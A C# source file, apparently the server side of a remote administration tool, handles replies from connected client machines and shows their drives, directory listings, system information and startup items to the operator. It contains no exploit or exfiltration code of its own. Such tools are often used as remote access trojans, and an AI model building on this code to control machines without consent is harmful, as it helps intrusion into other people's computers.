using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Enums;
using xServer.Forms;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleGetDrivesResponse(Client client, GetDrivesResponse packet)
        {
            if (client.Value == null || client.Value.FrmFm == null || packet.DriveDisplayName == null || packet.RootDirectory == null)
                return;

            if (packet.DriveDisplayName.Length != packet.RootDirectory.Length) return;

            RemoteDrive[] drives = new RemoteDrive[packet.DriveDisplayName.Length];
            for (int i = 0; i < packet.DriveDisplayName.Length; i++)
            {
                drives[i] = new RemoteDrive(packet.DriveDisplayName[i], packet.RootDirectory[i]);
            }

            if (client.Value != null && client.Value.FrmFm != null)
            {
                client.Value.FrmFm.AddDrives(drives);
                client.Value.FrmFm.SetStatus("Ready");
            }
        }

        public static void HandleGetDirectoryResponse(Client client, GetDirectoryResponse packet)
        {
            if (client.Value == null || client.Value.FrmFm == null)
                return;

            new Thread(() =>
            {
                if (client.Value.ProcessingDirectory) return;
                client.Value.ProcessingDirectory = true;

                client.Value.FrmFm.ClearFileBrowser();
                client.Value.FrmFm.AddItemToFileBrowser("..", 0, PathType.Back, 0);

                if (packet.Folders != null && packet.Folders.Length != 0 && client.Value.ProcessingDirectory)
                {
                    for (int i = 0; i < packet.Folders.Length; i++)
                    {
                        if (packet.Folders[i] != DELIMITER)
                        {
                            if (client.Value == null || client.Value.FrmFm == null || !client.Value.ProcessingDirectory)
                                break;

                            client.Value.FrmFm.AddItemToFileBrowser(packet.Folders[i], 0, PathType.Directory, 1);
                        }
                    }
                }

                if (packet.Files != null && packet.Files.Length != 0 && client.Value.ProcessingDirectory)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        if (packet.Files[i] != DELIMITER)
                        {
                            if (client.Value == null || client.Value.FrmFm == null || !client.Value.ProcessingDirectory)
                                break;

                            client.Value.FrmFm.AddItemToFileBrowser(packet.Files[i],
                                packet.FilesSize[i], PathType.File,
                                FileHelper.GetFileIcon(Path.GetExtension(packet.Files[i])));
                        }
                    }
                }

                if (client.Value != null)
                {
                    client.Value.ReceivedLastDirectory = true;
                    client.Value.ProcessingDirectory = false;
                    if (client.Value.FrmFm != null)
                        client.Value.FrmFm.SetStatus("Ready");
                }
            }).Start();
        }

        public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
        {
            if (packet.SystemInfos == null)
                return;

            if (Settings.ShowToolTip)
            {
                var builder = new StringBuilder();
                for (int i = 0; i < packet.SystemInfos.Length; i += 2)
                {
                    if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                    {
                        builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
                    }
                }

                FrmMain.Instance.SetToolTipText(client, builder.ToString());
            }

            if (client.Value == null || client.Value.FrmSi == null)
                return;

            ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
            for (int i = 0, j = 0; i < packet.SystemInfos.Length; i += 2, j++)
            {
                if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                {
                    lviCollection[j] = new ListViewItem(new string[] { packet.SystemInfos[i], packet.SystemInfos[i + 1] });
                }
            }

            if (client.Value != null && client.Value.FrmSi != null)
                client.Value.FrmSi.AddItems(lviCollection);
        }

        public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
        {
            if (client.Value == null || client.Value.FrmStm == null || packet.StartupItems == null)
                return;

            foreach (var item in packet.StartupItems)
            {
                if (client.Value == null || client.Value.FrmStm == null) return;

                int type;
                if (!int.TryParse(item.Substring(0, 1), out type)) continue;

                string preparedItem = item.Remove(0, 1);
                var temp = preparedItem.Split(new string[] { "||" }, StringSplitOptions.None);
                var l = new ListViewItem(temp)
                {
                    Group = client.Value.FrmStm.GetGroup(type),
                    Tag = type
                };

                if (l.Group == null)
                    return;

                client.Value.FrmStm.AddAutostartItemToListview(l);
            }
        }
    }
}